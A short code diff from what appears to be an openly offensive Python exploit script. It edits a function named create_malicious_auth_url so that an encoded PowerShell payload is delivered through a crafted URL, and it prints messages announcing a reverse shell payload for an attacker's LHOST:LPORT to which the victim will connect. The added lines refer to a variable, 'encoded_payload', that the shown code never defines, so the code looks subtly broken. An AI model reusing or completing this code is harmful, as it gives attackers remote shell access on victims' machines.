@@ -35,7 +35,11 @@ def create_malicious_auth_url():
     
     # Return as data URI that browsers can execute
     encoded = urllib.parse.quote(ps_payload)
-    return f"data:text/plain;charset=utf-8,{encoded}"
+    malicious_url = f"http://a/{encoded_payload}"
+
+    print(f"\n💀 Reverse shell payload created for {LHOST}:{LPORT}")
+    print(f"🎯 Victim will connect to: {LHOST}:{LPORT}")
+    return malicious_url
 
 # JSON-RPC 2.0 helper functions
 def create_jsonrpc_response(id, result):
